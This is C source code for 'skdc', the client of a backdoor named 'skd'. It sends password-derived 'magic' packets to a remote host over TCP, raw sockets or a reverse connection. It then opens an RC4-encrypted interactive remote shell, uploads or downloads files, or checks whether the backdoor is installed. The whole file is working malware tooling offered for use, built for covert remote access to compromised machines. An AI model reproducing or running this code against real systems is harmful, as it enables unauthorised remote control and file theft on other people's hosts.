/*
 * We could implement all the combinations, but these are the best.
 *
 * Direct shell (tcp socket in client, tcp socket in server):
 * This mode bind a tcp port on the server and starts listening for new connections. This mode is for unprivileged 
 * user only, and let us to use the client also as a unprivileged user.
 * The workflow is:
 *  ./client -a shell -h host -d port 
 *
 * Direct shell using full RAW connection (raw socket in client, raw socket in server):
 *  ./client -a shell -h host -d port -l port
 *
 * Reverse shell (tcp socket in client, raw socket in server):
 *  ./client -a shell -h host -d port -l port
 *
 */

#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <termios.h>
#include <errno.h>
#include <stdlib.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

#include "raw.h"
#include "config.h"
#include "common.h"
#include "sha1.h"
#include "rc4.h"

struct rawsock r;
int winchange = 1;
unsigned char clientauth[20], serverauth[20], rc4key[20];
rc4_ctx rc4_crypt, rc4_decrypt;

// Per la redimesio de finestra
void sig_winch(int i) {
    signal(SIGWINCH, sig_winch);
    winchange = 1;
}

int usage(char *s) {
    printf("skdc - <whats[@t]wekk.net>\n"
           "==========================\n"
        "Usage:\n"
        "%s -a {shell|down|up|check|listen} [-c {tcp|raw|rev}] [-h host] [-l port] [-d port] [-f file] [-t secs]\n"
        "   -a: action to execute\n"
        "      * shell => launches a shell (-c required)\n"
        "      * down => download a file (-f required)\n"
        "      * up => uploads a file (-cf required)\n"
        "      * listen => listen for a tty connection (-cl required)\n"
        "      * check => check if skd is running on remote host (-cd required)\n"
		"   -c: connection type (-h required)\n"
        "      * tcp => a direct tcp connection to the server (-d required)\n"
        "      * rev => ask for a reverse connection (-ld required)\n"
        "      * raw => raw connection (only transfer small files) (-ld required)\n"
		"   -h: host or ip address\n"
		"   -l: local port to listen (enables reverse mode and disables raw mode)\n"
		"   -d: destination port to send magic\n"
        "   -f: file to upload or download\n"
        ,s);
	return -1;
}

// Client actions
int client_shell(int rsock, int wsock) {
    struct termios oldterm, newterm; 
    unsigned char buf[BUFSIZE];
    struct  winsize ws;
	struct timeval tv;
	int nfd = 0;

    rc4_init(rc4key, sizeof(RC4KEY), &rc4_crypt);
    rc4_init(rc4key, sizeof(RC4KEY), &rc4_decrypt);

    signal(SIGWINCH, sig_winch);

    // Terminal setup
    tcgetattr(0, &oldterm);
    newterm = oldterm;
    newterm.c_lflag &= ~(ICANON | ECHO | ISIG);
    newterm.c_iflag &= ~(IXON | IXOFF);
	errno = 0;
    tcsetattr(0, TCSAFLUSH, &newterm);
	if ( errno != 0 ) tcsetattr(0, TCSAFLUSH, &newterm);

	// Timeout
	tv.tv_sec=TIMEOUT/3;
	tv.tv_usec=0;

    while (1) {
        fd_set  fds;

        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(rsock, &fds);

        if (winchange) {
            if (ioctl(1, TIOCGWINSZ, &ws) == 0) {
                unsigned char buffer[5];
                buffer[0] = ECHAR;
                buffer[1] = (ws.ws_col >> 8) & 0xFF;
                buffer[2] = ws.ws_col & 0xFF;
                buffer[3] = (ws.ws_row >> 8) & 0xFF;
                buffer[4] = ws.ws_row & 0xFF;
                rc4(buffer, 5, &rc4_crypt);
                write(wsock, buffer, 5);
            }
            winchange = 0;
            continue;
        }

        errno = 0;
        nfd = select(rsock + 1, &fds, NULL, NULL, &tv);
        if (nfd < 0 && (errno != EINTR)) break;
		// if timeout
		else if (nfd == 0) {
			tv.tv_sec=TIMEOUT/3;
		    tv.tv_usec=0;
			unsigned char buffer[5];
			memset(buffer, 0, 5);
            buffer[0] = ECHAR;
            rc4(buffer, 5, &rc4_crypt);
            write(wsock, buffer, 5);
		}
		else {
        	/* stdin => server */
        	if (FD_ISSET(0, &fds)) {
        	    int count = read(0, buf, BUFSIZE);
        	    if (count <= 0 && (errno != EINTR)) break;
        	    if (memchr(buf, ECHAR, count)) {
                    rc4(buf, count, &rc4_crypt);
        	        write(wsock, buf, count);
                    break;
                }
                rc4(buf, count, &rc4_crypt);
        	    if (write(wsock, buf, count) <= 0 && (errno != EINTR)) break;
        	}

        	/* server => stdout */
        	if (FD_ISSET(rsock, &fds)) {
        	    int count = read(rsock, buf, BUFSIZE);
        	    if (count <= 0 && (errno != EINTR)) break;
                rc4(buf, count, &rc4_decrypt);
        	    if (memchr(buf, ECHAR, count)) break; // to let server kill client
        	    if (write(1, buf, count) <= 0 && (errno != EINTR)) break;
        	}
		}
    }

    perror("Connection disappeared");
    tcsetattr(0, TCSAFLUSH, &oldterm);
    close(rsock);
    close(wsock);

	return 0;
}

int client_upload(int sock, char *file) {
    int fd, bytes;
    unsigned char buf[BUFSIZE];
    unsigned long size, transfered;

    rc4_init(rc4key, sizeof(RC4KEY), &rc4_crypt);

    if ((fd = open(file, O_RDONLY)) < 0) {
        perror("open");
    } else {
        size = lseek(fd, 0, SEEK_END);
        lseek(fd, 0, SEEK_SET);
        bytes = 0;
        transfered = 0;
        printf("Size: %lu bytes\n", size);
        while ((bytes = read(fd, buf, BUFSIZE)) > 0) {
            rc4(buf, bytes, &rc4_crypt);
            if ((transfered += write(sock, buf, bytes)) < bytes) {
                printf("ERROR AL LLEGIR!\n");
            } else  {
                printf("\rUploaded: %lu%%", (transfered/(1+(size/100))));
            }
        }
        printf("\rUploaded: 100%%\n");
        printf("Fitxer %s enviat!\n", file);
        sleep(2);
    }

    return 0;
}

int client_download(int sock, char *file) {
    int fd, bytes;
    unsigned char buf[BUFSIZE];
    char *ptr = strrchr(file, '/');
    struct timeval tv;
    int nfd = 0;
    fd_set  fds;

    rc4_init(rc4key, sizeof(RC4KEY), &rc4_decrypt);

    // Timeout
    tv.tv_sec=15;
    tv.tv_usec=0;

    if (ptr) { ptr++; }
    else { ptr = file; }

    if ((fd = open(ptr, O_RDWR|O_CREAT|O_TRUNC, S_IRWXU)) < 0) {
        perror("open");
    } else {
        bytes = 0;
        while (1) {
            FD_ZERO(&fds);
            FD_SET(sock, &fds);

            nfd = select(sock + 1, &fds, NULL, NULL, &tv);
            if (nfd == 0) break;
            else if (nfd > 0 && FD_ISSET(sock, &fds)) {                           
                if ((bytes = read(sock, buf, BUFSIZE)) <= 0 && (errno != EINTR)) {
                    break;
                } else {
                    errno = 0;
                    rc4(buf, bytes, &rc4_decrypt);
                    if (write(fd, buf, bytes) < bytes) {
                    printf("ERROR AL LLEGIR!\n");
                    }
                }
            }
        }
        printf("Fitxer %s guardat!\n", ptr);
    }

    return 0;
}

void client_check(int sockr) {
    int nfd = 0;
    struct timeval tv;

    fd_set  fds;
    FD_ZERO(&fds);
    FD_SET(sockr, &fds); 
    
    // Timeout
    tv.tv_sec=30;
    tv.tv_usec=0;

    nfd = select(sockr + 1, &fds, NULL, NULL, &tv);
    if (nfd > 0 && FD_ISSET(sockr, &fds))
        printf("FOUND an skd living on the other side!\n");
    else
        printf("NO skd living on the other side!\n");
}

void do_action(int action, int sockr, int sockw, char *file) {
    switch(action) {
        case UPLOAD:
        case REVUPLOAD:
            printf("Uploading file\n");
            client_upload(sockw, file);
            break;
        case DOWNLOAD:
        case REVDOWNLOAD:
            printf("Downloading file\n");
            client_download(sockr, file);
            break;
        case SHELL:
        case REVSHELL:
            printf("Launching shell (scape character is ^K) \n");
            client_shell(sockr, sockw);
            break;
        case CHECK:
        case REVCHECK:
            printf("Waiting for the check response\n");
            client_check(sockr);
            break;
        default:
            printf("Invalid option: %d\n", action);
    }
}
/*
unsigned long resolve(const char *host) {
    struct hostent *he;
    struct sockaddr_in si;
    
    he = gethostbyname(host);
    if (!he) {
        return INADDR_NONE;
    }
    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
    return si.sin_addr.s_addr;
}*/

void start_daemon(int action, int port, char *file, int pid) {
    int sock_listen, sock_con;
    struct sockaddr_in srv;
    struct sockaddr_in cli;
    unsigned int slen = sizeof(cli);
    int one = 1;

    //if (!fork()) return;
    
    sock_listen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_listen < 0) {
        perror("socket");
        exit(-1);
    }

    memset((char *) &srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = htonl(INADDR_ANY);
    srv.sin_port = htons(port);

    // We want to reuse the source port port (avoiding bind errors)
    if (setsockopt(sock_listen, SOL_SOCKET, SO_REUSEADDR, (char *)&one, sizeof(one)) < 0)
        perror("setsockopt: reuseaddr");

    if (bind(sock_listen, (struct sockaddr *) &srv, sizeof(srv)) < 0) {
        perror("bind");
        exit(-1);
    }

    if (listen(sock_listen, 1) < 0) {
        perror("listen");
        exit(-1);
    }

    printf("Listening to port %d\n", port);

	errno = 0;
    sock_con = accept(sock_listen, (struct sockaddr *) &cli, &slen);
    close(sock_listen);
    if (pid != 0) kill(pid, SIGTERM);

    if (sock_con < 0) {
        exit(-1);
    }

    printf("\nReceived connection!\n");

    do_action(action, sock_con, sock_con, file);

    exit(0);
}

void get_pass() {
    struct termios old, new;
    char p[64];
    sha1_context sha;
    sha1_starts(&sha);

    tcgetattr(0, &old);
    tcgetattr(0, &new);
    new.c_lflag &= ~(ECHO);
    new.c_lflag &= ~(ICANON | ECHO | ISIG );
    new.c_iflag &= ~(IXON | IXOFF);
    tcsetattr(0, TCSAFLUSH, &new);

    printf("password: "); fflush(stdout);
    fgets(p, 64, stdin); fflush(stdin);
    p[strlen(p) - 1] = '\0';
    tcsetattr(0, TCSAFLUSH, &old);

    sha1((unsigned char *)p, strlen(p), clientauth);
    printf("\n");
    int i = 0;
    for (i = 0; i < 20; i++) {
        serverauth[i] = clientauth[i]^p[0];
    }
    for (i = 0; i < 20; i++) {
        rc4key[i] = clientauth[i]^p[1];
    }
}

void raw_action(int action, short local_port, char *host, short dest_port, char *file) {
    int rawd_pid = 0;
    unsigned long ip;
    if (!getuid()) {

	    // Check hostname
	    ip = resolve(host, NULL);
        if (ip == INADDR_NONE) {
            perror("host");
            exit(-1);
        }

        pipe(r.r);
        pipe(r.w);
		r.sport = local_port;
		r.dport = dest_port;
        r.host = ip;

        rawd_pid = start_rawsock_clientd(&r, clientauth, serverauth);
		sleep(1);

		// action = SHELL
        send_rawsock_action(&r, action, file, clientauth);

        do_action(action, r.r[0], r.w[1], file);
		stop_rawsock_partner(&r, clientauth);
        kill(rawd_pid, 15);
    } else {
        printf("You need root acces for the raw mode\n");
    }
}

void listen_action(int action, short local_port) {
    //TODO: Send the action to do to the launcher
    start_daemon(action, local_port, NULL, 0);
}

void tcp_action(int action, short local_port, char *host, short dest_port, char *file) {
    struct data cmdpkt;
    struct sockaddr_in cli;
    unsigned long ip;

    // Connect to skd
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(-1);
    }
    
	// Check hostname
	ip = resolve(host, NULL);
    if (ip == INADDR_NONE) {
        perror("host");
        exit(-1);
    }

    memset(&cli, 0, sizeof(cli));
    cli.sin_family = AF_INET;
    cli.sin_port = htons(dest_port);
    cli.sin_addr.s_addr = ip;

    if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0 ) {
        perror("connect");
        exit(-1);
    }

    // Generate packet
    memcpy(cmdpkt.pass, clientauth, sizeof(clientauth));
    cmdpkt.port = local_port;
    cmdpkt.action = action;
	if (file) memcpy(cmdpkt.bytes, file, strlen(file));

    // Send packet
    write(sock, &cmdpkt, sizeof(cmdpkt));
    do_action(action, sock, sock, file);
    close(sock);    
}

int reverse_action(int action, short local_port, char *host, short dest_port, char *file) {
    struct data cmdpkt;
    struct sockaddr_in cli;
    unsigned long ip;
    int pid;
	// Launch daemon if is a reverse command
    switch (action) {
        case UPLOAD: action = REVUPLOAD; break;
        case DOWNLOAD: action = REVDOWNLOAD; break;
        case SHELL: action = REVSHELL; break;
        case CHECK: action = REVCHECK; break;
    }

    if ((pid = fork()) > 0) {
    	// Launch daemon and wait
        start_daemon(action, local_port, file, pid);
    } else {
		sleep(1);
        printf("Sending magic");fflush(stdout);
        while (1) {
            // Wait some time
            sleep(2);
            printf(".");fflush(stdout);
            // Connect to skd
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                perror("socket");
                continue;
            }
            
	        // Check hostname
	        ip = resolve(host, NULL);
            if (ip == INADDR_NONE) {
                perror("host");
                continue;
            }

            memset(&cli, 0, sizeof(cli));
            cli.sin_family = AF_INET;
            cli.sin_port = htons(dest_port);
            cli.sin_addr.s_addr = ip;
            if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0 ) {
                perror("connect");
                continue;
            }

            // Generate packet
            if (action == REVCHECK)
                memcpy(cmdpkt.pass, CHECKSTR, 20);
            else
                memcpy(cmdpkt.pass, clientauth, 20);
            cmdpkt.port = local_port;
            cmdpkt.action = action;
			if (file) {
				memset(cmdpkt.bytes, 0, sizeof(cmdpkt.bytes));
				memcpy(cmdpkt.bytes, file, strlen(file));
			}

            // Send packet
            write(sock, &cmdpkt, sizeof(cmdpkt));
            close(sock);
        }
    }
    return 0;
}

int main(int argc, char *argv[]) {
	int opt, local_port = -1, dest_port = -1, action = -1, con_type = -1;
	char *host = 0, *cmd, *file = 0;

	// Read params
	while ((opt = getopt(argc, argv, "a:c:h:l:d:f:t:") ) != EOF) {
        switch (opt) {
            case 'a':
                cmd = optarg;
                if (!strncmp(cmd, "shell", 5)) action = SHELL;
                else if (!strncmp(cmd, "down", 4)) action = DOWNLOAD;
                else if (!strncmp(cmd, "listen", 6)) action = LISTEN;
                else if (!strncmp(cmd, "up", 2)) action = UPLOAD;
                else if (!strncmp(cmd, "check", 5)) action = CHECK;
                break;
            case 'c':
                cmd = optarg;
                if (!strncmp(cmd, "tcp", 3)) con_type = CON_TCP;
                else if (!strncmp(cmd, "rev", 3)) con_type = CON_REV;
                else if (!strncmp(cmd, "raw", 3)) con_type = CON_RAW;
                else if (!strncmp(cmd, "listen", 6)) con_type = LISTEN;
                break;
            case 'h':
				host = optarg;
				break;
            case 'l':
                if (sscanf(optarg, "%u\n", &local_port) != 1)
                    return usage(argv[0]);
                break;
            case 'd':
                if (sscanf(optarg, "%u\n", &dest_port) != 1)
                    return usage(argv[0]);
                break;
            case 'f':
                file=optarg;
                break;
            default:
                usage(argv[0]);
                return -1;
        }
    }

	// Check the parameters dependences
	if ((local_port > 65535) || (dest_port  > 65535) ||  
        ((con_type == CON_TCP && ((!host) || (dest_port == -1)))) ||
        ((con_type == CON_REV && ((!host) || (dest_port == -1) || (local_port == -1) ))) ||
        ((con_type == CON_RAW && ((!host) || (dest_port == -1) || (local_port == -1) ))) ||
        ((con_type == LISTEN && (local_port == -1))) ||
        ((action == UPLOAD || action == DOWNLOAD) && (!file)) ||
//		((action == SHELL)    && ((!host) || (dest_port == -1))) ||
//		((action == UPLOAD)   && ((!host) || (dest_port == -1)   || (!file))) ||
//		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
//		((action == CHECK)    && ((!host) || (dest_port == -1))) ||
//		(local_port == -1 && con_type != CON_TCP) || (action == -1) ||
//      ((con_type == LISTEN && local_port == -1) ||
////		(con_type == -1) || (action == -1)
        ((con_type == LISTEN) && (action != SHELL)) ||
        (con_type == -1)
		)  {
			return usage(argv[0]);
	}

    if (action != CHECK) get_pass();
    sig_child(0);

	// Launch selected action
	switch (con_type) {
		case CON_TCP:
			tcp_action(action, local_port, host, dest_port, file);
			break;
		case CON_REV:
			reverse_action(action, local_port, host, dest_port, file);
			break;
		case CON_RAW:
			raw_action(action, local_port, host, dest_port, file);
			break;
		case LISTEN:
			listen_action(action, local_port);
			break;
	}

	return 0;
}
